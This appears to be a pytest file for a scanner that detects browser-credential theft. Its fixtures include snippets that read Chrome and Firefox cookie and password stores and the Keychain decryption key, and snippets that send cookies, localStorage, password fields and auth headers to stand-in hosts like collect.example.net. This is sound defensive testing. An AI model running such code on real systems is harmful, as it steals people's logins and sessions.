"""Browser credential handling: saved-login / cookie stores, session data sent off the
machine, and the informational browser-session capabilities.

All fixtures are synthetic snippets written for these tests.
"""
from __future__ import annotations

import pytest

from src.scanner.browser_credentials import (
    CAP_REAL_PROFILE,
    CAP_SESSION_PERSIST,
    CAP_SESSION_READ,
    SESSION_EXFIL_NAME,
    STORE_READ_NAME,
    browser_credential_hits,
)
from src.scanner.scan import ScanResult, _calculate_trust_score, _scan_content


def _defects(src: str, lang: str):
    return [h for h in browser_credential_hits(src, lang) if h.kind == "defect"]


def _caps(src: str, lang: str):
    return {h.capability for h in browser_credential_hits(src, lang) if h.kind == "capability"}


def _scan(src: str, path: str):
    findings, _, _ = _scan_content(src, path)
    return findings


# ── credential-store read ──────────────────────────────────────────────────────────

STORE_POSITIVE = {
    "chrome_cookies_sqlite": ("python", (
        "import os, sqlite3\n"
        "db = os.path.join(profile_root, 'Default', 'Cookies')\n"
        "con = sqlite3.connect(db)\n"
        "rows = con.execute('SELECT host_key, name, encrypted_value FROM cookies').fetchall()\n"
    )),
    "chrome_login_data": ("python", (
        "import sqlite3\n"
        "path = home + '/Library/Application Support/Google/Chrome/Default/Login Data'\n"
        "cur = sqlite3.connect(path).cursor()\n"
        "cur.execute('SELECT origin_url, username_value, password_value FROM logins')\n"
    )),
    "keychain_safe_storage": ("python", (
        "import subprocess\n"
        "store = '~/Library/Application Support/Google/Chrome/Default/Cookies'\n"
        "key = subprocess.check_output(['security', 'find-generic-password', '-w', '-s',\n"
        "                               'Chrome Safe Storage'])\n"
    )),
    "local_state_key": ("python", (
        "import json\n"
        "local_state = json.load(open(user_data + '/User Data/Local State'))\n"
        "enc = local_state['os_crypt']['encrypted_key']\n"
    )),
    "firefox_moz_cookies_js": ("javascript", (
        "const Database = require('better-sqlite3');\n"
        "const db = new Database(path.join(profile, 'cookies.sqlite'));\n"
        "const rows = db.prepare('SELECT host, name, value FROM moz_cookies').all();\n"
    )),
}


@pytest.mark.parametrize("case", sorted(STORE_POSITIVE))
def test_store_read_is_high(case):
    lang, src = STORE_POSITIVE[case]
    hits = _defects(src, lang)
    assert [(h.name, h.severity) for h in hits] == [(STORE_READ_NAME, "high")], case


STORE_NEGATIVE = {
    # an app's own table that happens to hold encrypted values
    "app_secret_table": ("python",
                         "rows = db.execute('SELECT id, encrypted_value FROM secrets').fetchall()\n"),
    # a web app's own `cookies` table, no browser store anywhere
    "app_cookie_table": ("python",
                         "cur.execute('SELECT id, name FROM cookies WHERE user_id = %s', (u,))\n"),
    # the schema word in a docstring-free comment
    "comment_only": ("python", "# Chrome keeps encrypted_value in Default/Cookies\nx = 1\n"),
    # reading the profile list from Local State (no decrypt key)
    "profile_list": ("python", (
        "local_state = json.load(open(Path(user_data) / 'Local State'))\n"
        "names = local_state['profile']['info_cache']\n"
    )),
}


@pytest.mark.parametrize("case", sorted(STORE_NEGATIVE))
def test_store_read_negatives(case):
    lang, src = STORE_NEGATIVE[case]
    assert _defects(src, lang) == [], case


def test_store_read_in_a_docstring_is_not_reported():
    src = (
        '"""Helper.\n\n'
        "Chrome's Default/Cookies keeps encrypted_value; 'Chrome Safe Storage' decrypts it.\n"
        '"""\n'
        "x = 1\n"
    )
    names = {f.name for f in _scan(src, "helper.py")}
    assert STORE_READ_NAME not in names


def test_store_read_then_sent_is_one_critical_not_also_a_high():
    src = (
        "import os, sqlite3, requests\n"
        "p = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')\n"
        "data = open(p, 'rb').read()\n"
        "rows = sqlite3.connect(p).execute('SELECT password_value FROM logins').fetchall()\n"
        "requests.post('https://collect.example.net/u', data=data)\n"
    )
    found = _scan(src, "steal.py")
    names = [(f.name, f.severity) for f in found if f.category == "exfiltration"]
    assert ("Credential file read sent outbound", "critical") in names
    assert all(n != STORE_READ_NAME for n, _ in names)


def test_store_read_in_tests_dir_is_medium():
    lang, src = STORE_POSITIVE["chrome_cookies_sqlite"]
    found = [f for f in _scan(src, "tests/test_cookies.py") if f.name == STORE_READ_NAME]
    assert found and found[0].severity == "medium"


# ── session data sent to a network endpoint ────────────────────────────────────────

EXFIL_POSITIVE = {
    "document_cookie_beacon": ("javascript", (
        "const c = document.cookie;\n"
        "navigator.sendBeacon('https://collect.example.net/c', c);\n"
    ), "critical"),
    "image_pixel": ("javascript",
                    "new Image().src = 'https://px.example.net/c?d=' + document.cookie;\n",
                    "critical"),
    "local_storage_dump_fetch": ("javascript", (
        "const dump = JSON.stringify(localStorage);\n"
        "fetch('https://collect.example.net/ls', { method: 'POST', body: dump });\n"
    ), "critical"),
    "playwright_context_cookies": ("typescript", (
        "import { chromium } from 'playwright';\n"
        "const cookies = await context.cookies();\n"
        "const payload = JSON.stringify({ cookies, url: page.url() });\n"
        "await fetch('https://api.example.org/ingest', { method: 'POST', body: payload });\n"
    ), "critical"),
    "playwright_cookies_variable_url": ("typescript", (
        "import { chromium } from 'playwright';\n"
        "const cookies = await context.cookies();\n"
        "await axios.post(endpoint, { cookies });\n"
    ), "high"),
    "puppeteer_storage_item_python": ("python", (
        "from playwright.async_api import async_playwright\n"
        "token = await page.evaluate(\"() => localStorage.getItem('auth_token')\")\n"
        "requests.post('https://hooks.example.io/t', json={'t': token})\n"
    ), "critical"),
    "cdp_all_cookies": ("javascript", (
        "const client = await page.target().createCDPSession();\n"
        "const { cookies } = await client.send('Network.getAllCookies');\n"
        "await fetch(remote, { method: 'POST', body: JSON.stringify(cookies) });\n"
    ), "high"),
    "password_field_value": ("javascript", (
        "const pw = document.querySelector('input[type=\"password\"]').value;\n"
        "fetch('https://collect.example.net/p', {method: 'POST', body: pw});\n"
    ), "critical"),
    "captured_auth_header": ("typescript", (
        "import { chromium } from 'playwright';\n"
        "page.on('request', (r) => {\n"
        "  const auth = r.headers()['authorization'];\n"
        "  if (auth) fetch('https://collect.example.net/h', {method: 'POST', body: auth});\n"
        "});\n"
    ), "critical"),
    "extension_cookies_getall": ("javascript", (
        "const all = await chrome.cookies.getAll({});\n"
        "await fetch(SERVER, { method: 'POST', body: JSON.stringify(all) });\n"
    ), "high"),
}


@pytest.mark.parametrize("case", sorted(EXFIL_POSITIVE))
def test_session_exfil_positive(case):
    lang, src, sev = EXFIL_POSITIVE[case]
    hits = _defects(src, lang)
    assert [(h.name, h.severity) for h in hits] == [(SESSION_EXFIL_NAME, sev)], case


EXFIL_NEGATIVE = {
    # the session replayed to the site it came from (authentication, not exfil)
    "replay_cookies_kwarg": ("python", (
        "from playwright.sync_api import sync_playwright\n"
        "cookies = context.cookies()\n"
        "jar = {c['name']: c['value'] for c in cookies}\n"
        "requests.post(url, cookies=jar, data={'q': 1})\n"
    )),
    "replay_cookie_header": ("typescript", (
        "import { chromium } from 'playwright';\n"
        "const cookies = await context.cookies();\n"
        "const cookieHeader = cookies.map((c) => `${c.name}=${c.value}`).join('; ');\n"
        "await fetch(target, { headers: { Cookie: cookieHeader } });\n"
    )),
    # a web front end: its own token to its own API (Authorization header)
    "spa_bearer_token": ("javascript", (
        "const token = localStorage.getItem('token');\n"
        "fetch(API_URL + '/me', { headers: { Authorization: `Bearer ${token}` } });\n"
    )),
    # a web front end refreshing its own token against a configured API
    "spa_refresh_body": ("javascript", (
        "const rt = localStorage.getItem('refresh');\n"
        "axios.post(`${API}/auth/refresh`, { refresh: rt });\n"
    )),
    # CSRF double-submit: one cookie, same-origin
    "csrf_double_submit": ("javascript", (
        "const t = document.cookie.match(/csrftoken=([^;]+)/)[1];\n"
        "fetch('/api/items', { method: 'POST', headers: { 'X-CSRFToken': t } });\n"
    )),
    "same_origin_relative": ("javascript", (
        "const all = document.cookie;\n"
        "fetch('/debug/cookies', { method: 'POST', body: all });\n"
    )),
    # a local bridge to the agent (localhost connector)
    "localhost_bridge": ("javascript", (
        "const dump = JSON.stringify(localStorage);\n"
        "fetch('http://127.0.0.1:3025/storage', { method: 'POST', body: dump });\n"
    )),
    # setting a cookie is not reading one
    "set_cookie": ("javascript", (
        "document.cookie = 'theme=dark; path=/';\n"
        "fetch('https://api.example.org/prefs', { method: 'POST', body: '{}' });\n"
    )),
    # a name that only appears inside a URL string
    "name_inside_string": ("typescript", (
        "import { chromium } from 'playwright';\n"
        "const raw = sessionStorage.getItem('panel');\n"
        "logo.src = 'https://raw.example.org/logo.png';\n"
    )),
    # the word "cookie" alone
    "cookie_banner": ("javascript", (
        "const msg = 'We use cookies to improve your experience';\n"
        "fetch('https://api.example.org/consent', { method: 'POST', body: msg });\n"
    )),
    # a front end that only MENTIONS Chromium is not a browser-automation tool
    "frontend_mentions_chromium": ("javascript", (
        "// Chromium drops the token on reload; re-send it\n"
        "const token = localStorage.getItem('token');\n"
        "axios.post(apiBase + '/session', { token });\n"
    )),
    # a framework's request cookies outside any browser automation
    "server_request_cookies": ("python", (
        "sid = request.cookies.get('sid')\n"
        "requests.post('https://auth.example.org/check', json={'sid': sid})\n"
    )),
}


@pytest.mark.parametrize("case", sorted(EXFIL_NEGATIVE))
def test_session_exfil_negative(case):
    lang, src = EXFIL_NEGATIVE[case]
    assert _defects(src, lang) == [], case


def test_session_exfil_is_scored_and_blocking():
    lang, src, _sev = EXFIL_POSITIVE["document_cookie_beacon"]
    found = [f for f in _scan(src, "src/content.js") if f.name == SESSION_EXFIL_NAME]
    assert found and found[0].severity == "critical"
    assert found[0].category == "exfiltration" and found[0].kind == "defect"
    r = ScanResult(repo="t/t", stars=0, description="", framework="", findings=found)
    assert r.critical_count == 1
    assert _calculate_trust_score(r) <= 45


# ── capabilities (reported, never scored) ──────────────────────────────────────────

def test_storage_state_save_is_a_capability_only():
    src = (
        "import { chromium } from 'playwright';\n"
        "const context = await browser.newContext();\n"
        "await context.storageState({ path: 'auth/state.json' });\n"
    )
    assert _defects(src, "typescript") == []
    assert _caps(src, "typescript") == {CAP_SESSION_PERSIST}


def test_cookie_read_and_written_to_file_is_a_capability_only():
    src = (
        "from playwright.sync_api import sync_playwright\n"
        "cookies = context.cookies()\n"
        "Path('cookies.json').write_text(json.dumps(cookies))\n"
    )
    assert _defects(src, "python") == []
    assert _caps(src, "python") == {CAP_SESSION_READ, CAP_SESSION_PERSIST}


def test_real_profile_is_a_capability_only():
    src = (
        "from pathlib import Path\n"
        "def default_user_data_dir():\n"
        "    return Path.home() / 'Library' / 'Application Support' / 'Google' / 'Chrome'\n"
        "browser = p.chromium.launch_persistent_context(user_data_dir=default_user_data_dir())\n"
    )
    assert _defects(src, "python") == []
    assert _caps(src, "python") == {CAP_REAL_PROFILE}


def test_dedicated_profile_dir_is_not_reported():
    src = (
        "const userDataDir = path.join(os.homedir(), '.cache', 'my-mcp', 'chrome-profile');\n"
        "await chromium.launchPersistentContext(userDataDir, { headless: true });\n"
    )
    assert browser_credential_hits(src, "javascript") == []


def test_capabilities_do_not_move_the_score():
    src = (
        "import { chromium } from 'playwright';\n"
        "const cookies = await context.cookies();\n"
        "await context.storageState({ path: 'state.json' });\n"
    )
    found = _scan(src, "src/session.ts")
    caps = [f for f in found if f.capability.startswith("browser:")]
    assert caps and all(f.kind == "capability" and f.severity == "info" for f in caps)
    r = ScanResult(repo="t/t", stars=0, description="", framework="", findings=caps)
    assert r.critical_count == r.high_count == r.medium_count == 0
    assert {c["capability"] for c in r.capabilities} == {CAP_SESSION_READ, CAP_SESSION_PERSIST}


def test_non_code_languages_are_skipped():
    src = "SELECT host_key, encrypted_value FROM cookies -- Google/Chrome Default/Cookies\n"
    assert browser_credential_hits(src, "go") == []
    assert browser_credential_hits(src, None) == []


def test_allowlist_suppresses():
    lang, src = STORE_POSITIVE["chrome_cookies_sqlite"]
    findings, _, _ = _scan_content(src, "tool.py", {("tool.py", STORE_READ_NAME)})
    assert all(f.name != STORE_READ_NAME for f in findings)
